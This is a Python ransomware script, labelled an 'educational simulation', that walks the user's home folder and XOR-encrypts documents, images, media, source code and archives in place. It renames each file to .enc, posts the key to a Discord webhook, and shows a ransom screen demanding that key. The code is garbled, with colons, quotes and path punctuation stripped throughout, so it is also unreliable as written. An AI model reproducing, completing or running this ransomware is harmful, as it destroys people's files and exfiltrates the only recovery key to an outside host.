import os
import random
import threading
import time
import requests

key = ''
list_of_files = []

# File extensions to target
sensitive_extensions = [
    '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
    '.odt', '.ods', '.odp', '.pdf',
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.raw', '.cr2', '.nef', '.arw',
    '.mp4', '.avi', '.mov', '.mkv', '.wmv',
    '.mp3', '.wav', '.flac', '.aac', '.ogg',
    '.html', '.css', '.js', '.py', '.java', '.c', '.cpp', '.cs', '.rb', '.php',
    '.sql', '.json', '.xml', '.yml',
    '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2',
    '.psd', '.ai', '.indd', '.dwg', '.dxf'
]

def get_files(encryption=True)
    Collects files to encrypt or decrypt.
    path = os.path.expanduser(~)
    print(path)
    input(Attention)
    input(Attention)
    input(Attention)
    input(Attention)
    global list_of_files
    list_of_files.clear()
    for root, dirs, files in os.walk(path)
        for file in files
            full_path = os.path.join(root, file)
            if file.lower() == ransomware.py
                print(Main script location  + full_path)
                continue
            if encryption
                if file.lower().endswith(tuple(sensitive_extensions)) and not file.endswith(.enc)
                    list_of_files.append(full_path)
                    print(file)
            else
                if file.endswith(.enc)
                    list_of_files.append(full_path)

def generate_key()
    Generates a random encryption key.
    global key
    characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    key = ''.join(random.choice(characters) for _ in range(64))
    print(f{key})
    try
        webhook_url = httpsdiscord.comapiwebhooks1116189397935734885LPHtwWUw2KA12W7_ikBEkXk-4abynJu1-kaZapt3JvjGofOMsgU_kzYw02ddFgbRXotR
        data = {content f{key}}
        requests.post(webhook_url, json=data)
    except
        print(Key not sent)

def encrypt_file(file)
    Encrypts a file and adds .enc extension.
    try
        key_index = 0
        with open(file, 'rb') as f
            data = f.read()
        encrypted = bytearray()
        for byte in data
            encrypted.append(byte ^ ord(key[key_index]))
            key_index = (key_index + 1) % len(key)
        with open(file, 'wb') as f
            f.write(encrypted)
        new_file = file + .enc
        os.rename(file, new_file)
        print(f[ENCRYPTED]  {new_file})
    except Exception as e
        print(f[ENCRYPTION ERROR]  {file} ({e}))

def decrypt_file(file)
    Decrypts a .enc file and removes the extension.
    try
        key_index = 0
        with open(file, 'rb') as f
            data = f.read()
        decrypted = bytearray()
        for byte in data
            decrypted.append(byte ^ ord(key[key_index]))
            key_index = (key_index + 1) % len(key)
        with open(file, 'wb') as f
            f.write(decrypted)
        new_file = file[-4]  # remove .enc
        os.rename(file, new_file)
        print(f[DECRYPTED]  {new_file})
    except Exception as e
        print(f[DECRYPTION ERROR]  {file} ({e}))

def run_in_threads(task_function)
    Runs the task function in parallel threads.
    start_time = time.time()
    threads = []
    for file in list_of_files
        t = threading.Thread(target=task_function, args=(file,))
        threads.append(t)
        t.start()
    for t in threads
        t.join()
    end_time = time.time()
    print(fn[Execution Time]  {end_time - start_time.2f} seconds)

def intro()
    Ransomware interface
    def cls()
        os.system('cls' if os.name == 'nt' else 'clear')
    cls()
    logo = r[ BlackCoffin Ransomware - Educational Simulation ]
    print(logo)
    print(n Your system has been compromised.)
    print( All sensitive files have been encrypted.)
    print( Please enter the decryption key to restore them.)
    while True
        key_input = input(Enter the key )
        if key_input == key
            get_files(encryption=False)
            run_in_threads(decrypt_file)
            break
        else
            print(Incorrect key. Try again.)

# --- Program Execution ---
generate_key()
get_files(encryption=True)
run_in_threads(encrypt_file)
intro()
